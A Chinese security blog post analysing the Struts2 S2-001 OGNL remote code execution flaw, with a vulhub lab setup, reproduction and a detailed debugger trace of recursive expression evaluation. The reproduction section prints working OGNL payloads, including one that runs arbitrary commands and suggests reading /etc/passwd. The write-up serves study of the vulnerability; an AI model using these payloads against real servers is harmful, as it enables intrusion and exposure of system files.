> 原文链接: https://www.anquanke.com//post/id/246100 


# Struts2-001 远程代码执行漏洞浅析


                                阅读量   
                                **57478**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t0183403c7a04557994.jpg)](https://p4.ssl.qhimg.com/t0183403c7a04557994.jpg)



## 一、原理

### <a class="reference-link" name="%EF%BC%88%E4%B8%80%EF%BC%89%E6%A6%82%E8%BF%B0"></a>（一）概述

搭建环境后，查看[参考link](https://struts.apache.org/docs/s2-001.html)，可了解相关信息。

|读者人群|所有Struts 2 开发者
|------
|漏洞影响|远程代码执行
|影响程度|重大
|影响软件|WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 – WebWork 2.2.5, Struts 2.0.0 – Struts 2.0.8

### <a class="reference-link" name="%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8E%9F%E7%90%86"></a>（二）原理

漏洞的产生在于WebWork 2.1 和Struts 2的’altSyntax’配置允许OGNL 表达式被插入到文本字符串中并被递归处理（Struts2框架使用OGNL作为默认的表达式语言，OGNL是一种表达式语言，目的是为了在不能写Java代码的地方执行java代码；主要作用是用来存数据和取数据的）。这就导致恶意用户可以提交一个字符串（通常通过HTML的text字段），该字符串包含一个OGNL表达式，在表单验证失败后，此表达式会被server执行。例如，下面的表单默认不允许’phoneNumber’字段为空。

```
&lt;s:form action="editUser"&gt;
  &lt;s:textfield name="name" /&gt;
  &lt;s:textfield name="phoneNumber" /&gt;
&lt;/s:form&gt;
```

此时，恶意用户可以将phoneNumber字段置空以触发验证错误，再控制name字段的值为 %`{`1+1`}`。当表单被重新展示给用户时，name字段的值将为2。产生这种情况的原因是这个字段默认被当作%`{`name`}`处理，由于OGNL表达式被递归处理，处理的效果等同于%`{`%`{`1+1`}``}`。实际上，相关的OGNL解析代码在XWork组件中，并不在WebWork 2或Struts 2内。

用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %`{`value`}` 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %`{`value`}` 对提交的数据执行了一次 OGNL 表达式解析，所以可以构造 payload 进行命令执行。

提交表单并验证失败时，由于Strust2默认会原样返回用户输入的值而且不会跳转到新的页面，因此当返回用户输入的值并进行标签解析时，如果开启了altSyntax，会调用translateVariables方法对标签中表单名进行OGNL表达式递归解析返回ValueStack值栈中同名属性的值。因此我们可以构造特定的表单值让其进行OGNL表达式解析从而达到任意代码执行。



## 二、调试

### <a class="reference-link" name="%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>（一）环境搭建

使用vulhub/struts2/s2-001

```
docker-compose build
docker-compose up -d
```

为了动态调试，我们将IDEA中默认生成的这句话append到 Tomcat 的 bin 目录下的`catalina.sh`文件（如果是 Windows 系统则修改`catalina.bat`文件），

```
export JAVA_OPTS='-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8001'
```

原docker-compose.yml修改如下，

```
version: '2'
services:
 tomcat:
   build: .
   ports:
    - "8080:8080"
    - "8001:8001"
   environment:
     TZ: Asia/Shanghai
     JPDA_ADDRESS: 8001
     JPDA_TRANSPORT: dt_socket
   command: ["catalina.sh", "jpda", "run"]
   networks:
      - default
```

调用栈将`docker-compose down`之后再`docker-compose up -d`，即可正常使用idea调试。

[![](https://p4.ssl.qhimg.com/t0169441106e815f66d.png)](https://p4.ssl.qhimg.com/t0169441106e815f66d.png)

接下来将webapps/ROOT/WEB-INF下的lib和classes都加入idea的lib。

### <a class="reference-link" name="%EF%BC%88%E4%BA%8C%EF%BC%89%E5%A4%8D%E7%8E%B0"></a>（二）复现

环境搭建完毕后访问[http://xxxx:8080/查看结果，](http://xxxx:8080/%E6%9F%A5%E7%9C%8B%E7%BB%93%E6%9E%9C%EF%BC%8C)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a84690243a06cff8.png)

其中的password存在漏洞，用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %`{`value`}` 进行解析，然后重新填充到对应的表单数据中。

在translateVariables方法中，递归解析表达式，在处理完%`{`password`}`后将password的值直接取出并继续在while循环中解析，若用户输入的password是恶意的ognl表达式，则得以解析执行。

按照vulhub的提示，我们可以使用如下命令获取tomcat执行路径：

```
%`{`"tomcatBinDir`{`"+@java.lang.System@getProperty("user.dir")+"`}`"`}`
```

[![](https://p2.ssl.qhimg.com/t0104173778815eefcd.png)](https://p2.ssl.qhimg.com/t0104173778815eefcd.png)

重新渲染后，password字段已经变为执行结果。

[![](https://p4.ssl.qhimg.com/t01c412c8874486d3da.png)](https://p4.ssl.qhimg.com/t01c412c8874486d3da.png)

相应的可以执行其他命令，这里不过多展示。

获取Web路径：

```
%`{`#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()`}`
```

执行任意命令（命令加参数：`new java.lang.String[]`{`"cat","/etc/passwd"`}``）：

```
%`{`#a=(new java.lang.ProcessBuilder(new java.lang.String[]`{`"pwd"`}`)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()`}`
```

### <a class="reference-link" name="%EF%BC%88%E4%B8%89%EF%BC%89%E8%B0%83%E8%AF%95"></a>（三）调试

[Struts运行流程](https://www.jianshu.com/p/99705a8ad3c3)如下：

**1.用户发出请求**<br>
Tomcat接收请求，并选择处理该请求的Web应用。

**2.web容器去相应工程的web.xml**<br>
在web.xml中进行匹配，确定是由struts2的过滤器FilterDispatcher(StrutsPrepareAndExecuteFilter)来处理，找到该过滤器的实例(初始化)。

**3.找到FilterDispatcher,回调doFilter()**<br>
通常情况下，web.xml文件中还有其他过滤器时，FilterDispatcher是放在滤器链的最后；如果在FilterDispatcher前出现了如SiteMesh这种特殊的过滤器，还必须在SiteMesh前引用Struts2的ActionContextCleanUp过滤器。

**4.FilterDispatcher将请求转发给ActionMapper**<br>
ActionMapper负责识别当前的请求是否需要Struts2做出处理。

**5.ActionMapper告诉FilterDispatcher，需要处理这个请求，建立ActionProxy**<br>
FilterDispatcher会停止过滤器链以后的部分，所以通常情况下：FilterDispatcher应该出现在过滤器链的最后。然后建立一个ActionProxy对象，这个对象作为Action与xwork之间的中间层，会代理Action的运行过程.

**6.ActionProxy询问ConfigurationManager,读取Struts.xml**<br>
ActionProxy对象询问ConfigurationManager问要运行哪个Action。ConfigurationManager负责读取并管理struts.xml的（可以理解为ConfigurationManager是struts.xml在内存中的映像）。在服务器启动的时候，ConfigurationManager会一次性的把struts.xml中的所有信息读到内存里，并缓存起来，以保证ActionProxy拿着来访的URL向他询问要运行哪个Action的时候，就可以直接查询。

**7.ActionProxy建立ActionInvocation对象**<br>
ActionProxy获取了要运行的Action、相关的拦截器以及所有可能使用的result信息，开始建立ActionInvocation对象，ActionInvocation对象描述了Action运行的整个过程。

**8.在execute()之前的拦截器**<br>
在execute()之前会执行很多默认的拦截器。拦截器的运行被分成两部分，一部分在Action之前运行，一部分在Result之后运行，且顺序是相反的。如在Action执行前的顺序是拦截器1、拦截器2、拦截器3，那么运行Result之后，再次运行拦截器的时候，顺序就是拦截器3、拦截器2、拦截器1。

**9.执行execute()方法**

**10.根据execute方法返回的结果，也就是Result，在struts.xml中匹配选择下一个页面**

**11.找到模版页面,根据标签库生成最终页面**

**12.在execute()之后执行的拦截器,和8相反**

**13.ActionInvocation对象执行完毕**<br>
这时候已经得到了HttpServletResponse对象了,按照配置定义相反的顺序再经过一次过滤器,向客户端展示结果。

**<a class="reference-link" name="1.%E6%AD%A3%E5%B8%B8%E8%A7%A3%E6%9E%90%E9%83%A8%E5%88%86"></a>1.正常解析部分**

前半部分调用栈如下，

```
translateVariables:119, TextParseUtil (com.opensymphony.xwork2.util)
translateVariables:71, TextParseUtil (com.opensymphony.xwork2.util)
findValue:313, Component (org.apache.struts2.components)
evaluateParams:723, UIBean (org.apache.struts2.components)
end:481, UIBean (org.apache.struts2.components)
doEndTag:43, ComponentTagSupport (org.apache.struts2.views.jsp)
_jspx_meth_s_005ftextfield_005f1:16, index_jsp (org.apache.jsp)
_jspx_meth_s_005fform_005f0:16, index_jsp (org.apache.jsp)
_jspService:14, index_jsp (org.apache.jsp)
service:70, HttpJspBase (org.apache.jasper.runtime)
service:742, HttpServlet (javax.servlet.http)
...
```

发送请求，FilterDispatcher.doFilter被触发，这其中调用FilterDispatcher.serviceAction，

[![](https://p3.ssl.qhimg.com/t01202c98c21ae26f45.png)](https://p3.ssl.qhimg.com/t01202c98c21ae26f45.png)

invokeAction调用了action（LoginAction）的method（execute），

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012a4779e194ea20d4.png)

继续运行，断在LoginAction.execute()，

[![](https://p4.ssl.qhimg.com/t010d903af934f0f477.png)](https://p4.ssl.qhimg.com/t010d903af934f0f477.png)

显然，username不为admin，表单验证失败，此时Strust2默认会调用translateVariables方法对标签中表单名进行OGNL表达式递归解析返回ValueStack值栈中同名属性的值。

中间有若干底层流程，略过，我们直接在doStartTag()下断，

[![](https://p4.ssl.qhimg.com/t0189af1c79444d3627.png)](https://p4.ssl.qhimg.com/t0189af1c79444d3627.png)

本函数的功能是开始解析标签，

继续向下，开始加载第一个TextField，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016ac117350939842f.png)

接下来如果配置正确（我反正没有配置正确😥，只能看到下图），应该会进入jsp页面中，便可以清晰的看到jsp页面被逐标签解析。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01932071af6a6d863b.png)

当加载到`/&gt;`时，会进入doEndTag()函数，从名字可以判断，此函数的功能大概是完成对一个标签的解析，因为调试时payload放在了password里面，因而此处对于username的解析不过展示。

[![](https://p3.ssl.qhimg.com/t0139dd56c17d032fd3.png)](https://p3.ssl.qhimg.com/t0139dd56c17d032fd3.png)

此时前面的tag已经被展示出来，未进入doStartTag的password字段没有显示。

[![](https://p3.ssl.qhimg.com/t01e83c0a6dfb52c398.png)](https://p3.ssl.qhimg.com/t01e83c0a6dfb52c398.png)

接下来我们快进到第二个TextField（password）的doEndTag()。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012a0352408ad5e7d8.png)

跟进this.component.end()，进入了`org.apache.struts2.components.UIBean#end`，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01394e37f7164adbc7.png)

跟进this.evaluateParams();，

快进到this.altSyntax()处，

[![](https://p4.ssl.qhimg.com/t01e2d1967fd02f853b.png)](https://p4.ssl.qhimg.com/t01e2d1967fd02f853b.png)

前面提到，altSyntax默认是开启的，接下来的expr显而易见为%`{`password`}`，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0126761c99f2cedcb0.png)

跟进this.findValue(expr, valueClazz)，

[![](https://p1.ssl.qhimg.com/t01cedd3fca6f0b7560.png)](https://p1.ssl.qhimg.com/t01cedd3fca6f0b7560.png)

由前面可知，TextField 的valueClassType为class java.lang.String，且altSyntax默认开启，

[![](https://p0.ssl.qhimg.com/t01264e66b5744b0de0.png)](https://p0.ssl.qhimg.com/t01264e66b5744b0de0.png)

因此将会进入TextParseUtil.translateVariables(‘%’, expr, this.stack);，

步入，进入translateVariables，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0137c219f8d46669eb.png)

二级步入，将进入调试的主体部分`translateVariables(char open, String expression, ValueStack stack, Class asType, TextParseUtil.ParsedValueEvaluator evaluator)`，

此处传入的expression为%`{`password`}`，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01fd2b90eda5eba914.png)

接下来的while循环的目的是确定start和end的位置，

[![](https://p1.ssl.qhimg.com/t01df7d8b2abbae48a6.png)](https://p1.ssl.qhimg.com/t01df7d8b2abbae48a6.png)

此处显然不会进入if，

[![](https://p5.ssl.qhimg.com/t0196864846bb30e97e.png)](https://p5.ssl.qhimg.com/t0196864846bb30e97e.png)

接下来，取出%`{``}`表达式中的值，赋值给var，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t013987ff6174e2b6ab.png)

然后调用`stack.findValue(var, asType)`，由前面可知，此处的stack为`OgnlValueStack`，`OgnlValueStack`是[ValueStack](https://blog.csdn.net/qq_44757034/article/details/106838688)的实现类。

[![](https://p2.ssl.qhimg.com/t011007964fc4f9f1b1.png)](https://p2.ssl.qhimg.com/t011007964fc4f9f1b1.png)

valueStack是struts2的值栈空间，是struts2存储数据的空间，是一个接口，struts2使用OGNL表达式实际上是使用实现了ValueStack接口的类OgnlValueStack（它是ValueStack的默认实现类）。

客户端发起一个请求时，struts2会创建一个Action实例同时创建一个OgnlValueStack值栈实例，OgnlValueStack贯穿整个Action的生命周期。Struts2中使用OGNL将请求Action的参数封装为对象存储到值栈中，并通过OGNL表达式读取值栈中的对象属性值。

ValueStack中有两个主要区域
<li>CompoundRoot 区域：是一个ArrayList，存储了Action实例，它作为OgnlContext的Root对象。获取root数据不需要加`#`
</li>
- context 区域：即OgnlContext上下文，是一个Map，放置web开发常用的对象数据的引用。request、session、parameters、application等。获取context数据需要加#
操作值栈，通常指的是操作ValueStack中的root区域。

ValueStack类的setValue和findValue方法可以设置和获得Action对象的属性值。OgnlValueStack的findValue方法可以在CompoundRoot中从栈顶向栈底找查找对象的属性值。

跟进findValue()，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019f5b58889a950d3f.png)

由函数名可以推测， 这一函数的功能是查找expr对应的值，且此函数最终要`return value`，我们可以大胆设想，value变量是本函数的重点，如此，则需要重点关注对value进行操作的函数OgnlUtil.getValue，

[![](https://p5.ssl.qhimg.com/t010645294f8506ab7a.png)](https://p5.ssl.qhimg.com/t010645294f8506ab7a.png)

跟进，

[![](https://p4.ssl.qhimg.com/t0163f73d851e65f4ab.png)](https://p4.ssl.qhimg.com/t0163f73d851e65f4ab.png)

compile对’password’进行解析，返回了适用的结果。

接下来跟进Ognl.getValue，看起来此函数会结合root和context进行value的获取。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01889a6b0b9676d9dd.png)

显然，这里我们要关注的是result变量，这就需要跟进((Node)tree).getValue(ognlContext, root)。

[![](https://p2.ssl.qhimg.com/t01d42bfef62089960f.png)](https://p2.ssl.qhimg.com/t01d42bfef62089960f.png)

显然会进入下面的else分支，

[![](https://p0.ssl.qhimg.com/t016fe2a8ad1f88745e.png)](https://p0.ssl.qhimg.com/t016fe2a8ad1f88745e.png)

跟进之，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01900b09f922215518.png)

看起来，经历了若干级的调用，最终有效的是this.getValueBody(context, source)，

[![](https://p2.ssl.qhimg.com/t0154ee738b005b7ba2.png)](https://p2.ssl.qhimg.com/t0154ee738b005b7ba2.png)

跟进，可以看到再向下跟进最终是将password字段的值加载了进来。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016fd5ab85635c8b86.png)

不再深入跟进了，感觉好像没什么意义了😤，此时单单getValue的调用栈已经有几层了。

```
getProperty:1643, OgnlRuntime (ognl)getValueBody:92, ASTProperty (ognl)evaluateGetValueBody:170, SimpleNode (ognl)getValue:210, SimpleNode (ognl)getValue:333, Ognl (ognl)getValue:194, OgnlUtil (com.opensymphony.xwork2.util)findValue:238, OgnlValueStack (com.opensymphony.xwork2.util)
```

接下来步出几层，回到translateVariables:122, TextParseUtil (com.opensymphony.xwork2.util)，

[![](https://p2.ssl.qhimg.com/t01c9cf1e316af67011.png)](https://p2.ssl.qhimg.com/t01c9cf1e316af67011.png)

接下来经过拼接操作，expression被赋值，

[![](https://p5.ssl.qhimg.com/t01c48f43392c6421cd.png)](https://p5.ssl.qhimg.com/t01c48f43392c6421cd.png)

<a class="reference-link" name="2.%E9%80%92%E5%BD%92%E8%A7%A3%E6%9E%90%E9%83%A8%E5%88%86"></a>**2.递归解析部分**

我们观察到，此while循环只有一个出口，那就是if (start == -1 || end == -1 || count != 0)，因此这里进行完expression的赋值后，会开启新的一轮while。

这里我们可以看出，translateVariables无意之间递归解析了表达式，我们的password字段放置了`%`{`"tomcatBinDir`{`"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"`}`"`}``这样一个包含`%`{`expression`}``的字符串，%`{`password`}`的结果将再次被当作expression解析，就可能造成恶意ognl表达式的执行。

此次循环中，进入findValue的var是去掉前两个字符的expression，也就是`tomcatBinDir`{`"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"`}``。

[![](https://p3.ssl.qhimg.com/t01c2e22c549275f347.png)](https://p3.ssl.qhimg.com/t01c2e22c549275f347.png)

接下来跟进findValue()，这里的流程和上面是一样的，重点应该还是跟进OgnlUtil.getValue，

[![](https://p4.ssl.qhimg.com/t01b6cf3a78ce7380b8.png)](https://p4.ssl.qhimg.com/t01b6cf3a78ce7380b8.png)

和刚才相同的流程，深入跟进至evaluateGetValueBody:170, SimpleNode (ognl)<br>
getValue:210, SimpleNode (ognl)，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a7c56a8c2697dd4e.png)

跟进，

[![](https://p2.ssl.qhimg.com/t01b8b9249051174aee.png)](https://p2.ssl.qhimg.com/t01b8b9249051174aee.png)

在对于第一行的getValue()进行跟进几层之后，经过了一些表达式执行的操作，得到了result的第一部分。

接下来的for循环，会继续执行完整表达式`%`{`"tomcatBinDir`{`"+[@java](https://github.com/java).lang.System[@getProperty](https://github.com/getProperty)("user.dir")+"`}`"`}``的其他部分。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t010243f1f95ac9e538.png)

深入跟进时，发生了一些有趣的事情，

[![](https://p2.ssl.qhimg.com/t01941e779bd7511a09.png)](https://p2.ssl.qhimg.com/t01941e779bd7511a09.png)

这里调用了System.getProperty()，实际上实现了代码执行。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c2ebbcdff1ba18c9.png)

回到getValueBody，此时result已经被add上了新的一部分，

[![](https://p2.ssl.qhimg.com/t01115c184b2f363740.png)](https://p2.ssl.qhimg.com/t01115c184b2f363740.png)

各部分add之后，最终的result如下。

[![](https://p1.ssl.qhimg.com/t017abf4b5ad76d4686.png)](https://p1.ssl.qhimg.com/t017abf4b5ad76d4686.png)

逐级步出，回到TextParseUtil.translateVariables，expression被拼接为tomcatBinDir`{`/usr/local/tomcat`}`，开启一个新的循环。

但是此时，open为%，expression.indexOf(open + “`{`“)为-1，而start为-1时，将会return。

[![](https://p1.ssl.qhimg.com/t0123547bde3864375b.png)](https://p1.ssl.qhimg.com/t0123547bde3864375b.png)

简单跟进一下，

[![](https://p0.ssl.qhimg.com/t017ec74000810774fa.png)](https://p0.ssl.qhimg.com/t017ec74000810774fa.png)

可以猜测，这里是将Object类型的o转化为普通的字符串。

接下来简单步出，可将流程结束。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t019beb5dd8441ec35a.png)



## 三、收获与启示

借助学习和调试，了解了Struts2的运转流程，简单学习了OGNL表达式，增强了分析能力。

参考链接

[https://blog.csdn.net/qq_37602797/article/details/108121783](https://blog.csdn.net/qq_37602797/article/details/108121783)

[http://wechat.doonsec.com/article/?id=308b4bab7df3ecdb3bdda6fe1e026ac6](http://wechat.doonsec.com/article/?id=308b4bab7df3ecdb3bdda6fe1e026ac6)

[https://blog.csdn.net/qq_43571759/article/details/105122443](https://blog.csdn.net/qq_43571759/article/details/105122443)

[https://blog.csdn.net/Auuuuuuuu/article/details/86775808](https://blog.csdn.net/Auuuuuuuu/article/details/86775808)

[https://blog.csdn.net/weixin_44508748/article/details/105472482](https://blog.csdn.net/weixin_44508748/article/details/105472482)

[https://cloud.tencent.com/developer/article/1598043](https://cloud.tencent.com/developer/article/1598043)

[https://www.jianshu.com/p/99705a8ad3c3](https://www.jianshu.com/p/99705a8ad3c3)

[https://blog.csdn.net/yu102655/article/details/52179695](https://blog.csdn.net/yu102655/article/details/52179695)

[https://www.cnblogs.com/kuoAT/p/6527981.html](https://www.cnblogs.com/kuoAT/p/6527981.html)

[https://blog.csdn.net/qq_44757034/article/details/106838688](https://blog.csdn.net/qq_44757034/article/details/106838688)
